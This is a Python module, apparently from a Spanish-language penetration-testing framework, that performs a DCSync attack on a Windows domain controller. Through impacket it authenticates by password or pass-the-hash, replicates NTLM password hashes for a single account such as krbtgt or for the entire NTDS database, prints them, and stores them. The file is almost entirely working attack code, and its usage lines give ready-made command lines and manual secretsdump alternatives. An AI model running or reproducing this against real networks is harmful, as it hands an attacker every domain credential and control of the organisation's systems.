# scripts/smb/post/dcsync.py
"""
DCSync — replica credenciales del Domain Controller usando el protocolo MS-DRSR.
Equivalente a: secretsdump.py -just-dc DOMAIN/user@DC

Uso:
  python lobera.py smb -t 10.10.10.5 --script=dcsync -u Administrator -p Password
  python lobera.py smb -t 10.10.10.5 --script=dcsync -u Administrator -H :HASH
  python lobera.py smb -t 10.10.10.5 --script=dcsync -u Administrator -p Password --user krbtgt
  python lobera.py smb -t 10.10.10.5 --script=dcsync -u Administrator -p Password --all

Requiere: impacket (secretsdump / NTDSHashes)
"""

from core.output import console, print_result
from core import session_db


class Script:
    NAME        = "dcsync"
    DESCRIPTION = "DCSync — extrae hashes NTLM del DC vía MS-DRSR (secretsdump)"

    def __init__(self, target, creds):
        self.target = target
        self.creds  = creds

    def run(self, args):
        target      = str(self.target.ip)
        user        = getattr(args, 'username', None) or (self.creds.username if self.creds else None)
        password    = getattr(args, 'password', '') or (self.creds.password if self.creds else '')
        domain      = getattr(args, 'domain',   '') or (self.creds.domain   if self.creds else '')
        hash_       = getattr(args, 'hash',     None) or (self.creds.hash   if self.creds else None)
        target_user = getattr(args, 'dc_user',  None)   # --user krbtgt
        dump_all    = getattr(args, 'all',      False)

        if not user:
            console.print("[red]Falta -u USER[/red]")
            return

        lm_hash = nt_hash = ''
        if hash_:
            parts = hash_.split(':')
            lm_hash = parts[0] if len(parts) > 1 else 'aad3b435b51404eeaad3b435b51404ee'
            nt_hash = parts[-1]

        console.print(f"  [bold]DCSync[/bold] → {domain}\\{user}@{target}")
        if target_user:
            console.print(f"  Objetivo: [cyan]{target_user}[/cyan]")
        elif dump_all:
            console.print("  Modo: [yellow]dump completo NTDS[/yellow]")

        try:
            from impacket.examples.secretsdump import (
                RemoteOperations, NTDSHashes, SAMHashes
            )
            from impacket.smbconnection import SMBConnection

            smb = SMBConnection(target, target, timeout=10)
            if nt_hash:
                smb.login(user, '', domain, lm_hash, nt_hash)
            else:
                smb.login(user, password, domain)

            console.print(f"  [green]✓ Conectado al DC[/green]")

        except ImportError:
            console.print("  [red]impacket no instalado correctamente[/red]")
            return
        except Exception as e:
            console.print(f"  [red]✗ Error de conexión: {e}[/red]")
            return

        try:
            remote_ops = RemoteOperations(smb, False, None)
            remote_ops.enableRegistry()

            if target_user:
                # DCSync de un usuario específico
                console.print(f"\n  [bold]Replicando credenciales de {target_user}...[/bold]")
                self._dcsync_user(smb, remote_ops, domain, user, password,
                                  lm_hash, nt_hash, target, target_user)
            else:
                # Dump completo via secretsdump
                console.print("\n  [bold]Extrayendo hashes del NTDS...[/bold]")
                self._dump_ntds(smb, remote_ops, domain, user, password,
                                lm_hash, nt_hash, target, dump_all)

        except Exception as e:
            console.print(f"  [red]Error DCSync: {e}[/red]")
        finally:
            try:
                remote_ops.finish()
                smb.logoff()
            except Exception:
                pass

    def _dcsync_user(self, smb, remote_ops, domain, user, password,
                     lm_hash, nt_hash, target, target_user):
        """DCSync de usuario específico usando DRSGetNCChanges"""
        try:
            from impacket.examples.secretsdump import NTDSHashes

            def callback(secret):
                if ':' in secret:
                    parts = secret.split(':')
                    uname = parts[0]
                    rid   = parts[1] if len(parts) > 1 else '?'
                    lm    = parts[2] if len(parts) > 2 else ''
                    nt    = parts[3] if len(parts) > 3 else ''
                    console.print(f"  [bold cyan]{uname}[/bold cyan]:{rid}:[dim]{lm}[/dim]:[bold red]{nt}[/bold red]:::")
                    session_db.save_finding(
                        category="dcsync_hash",
                        data={"target": target, "user": uname, "nt_hash": nt, "lm_hash": lm}
                    )
                else:
                    console.print(f"  {secret}")

            NTDSHashes(
                None, None, isRemote=True,
                remoteOps=remote_ops,
                useVSSMethod=False,
                justNTLM=True,
                pwdLastSet=False,
                resumeSession=None,
                outputFileName=None,
                justUser=target_user,
                printUserStatus=False,
            ).dump(callback)

        except Exception as e:
            console.print(f"  [red]Error: {e}[/red]")
            console.print(f"  [yellow]Alternativa: secretsdump.py {domain}/{user}@{target} -just-dc-user {target_user}[/yellow]")

    def _dump_ntds(self, smb, remote_ops, domain, user, password,
                   lm_hash, nt_hash, target, dump_all):
        """Dump completo del NTDS"""
        hashes_found = []

        def callback(secret):
            console.print(f"  [cyan]{secret}[/cyan]")
            if ':' in secret:
                parts = secret.split(':')
                if len(parts) >= 4:
                    hashes_found.append({
                        "target": target,
                        "user": parts[0],
                        "nt_hash": parts[3]
                    })

        try:
            from impacket.examples.secretsdump import NTDSHashes

            NTDSHashes(
                None, None, isRemote=True,
                remoteOps=remote_ops,
                useVSSMethod=False,
                justNTLM=not dump_all,
                pwdLastSet=False,
                resumeSession=None,
                outputFileName=None,
                justUser=None,
                printUserStatus=False,
            ).dump(callback)

            console.print(f"\n  [bold green]✓ {len(hashes_found)} hashes extraídos[/bold green]")
            for h in hashes_found:
                session_db.save_finding(category="dcsync_hash", data=h)

        except Exception as e:
            console.print(f"  [red]Error dump NTDS: {e}[/red]")
            cred = f"-H {lm_hash}:{nt_hash}" if nt_hash else f"-p {password}"
            console.print(f"\n  [yellow]Alternativa manual:[/yellow]")
            console.print(f"    [cyan]secretsdump.py {domain}/{user}@{target} {cred} -just-dc-ntlm[/cyan]")
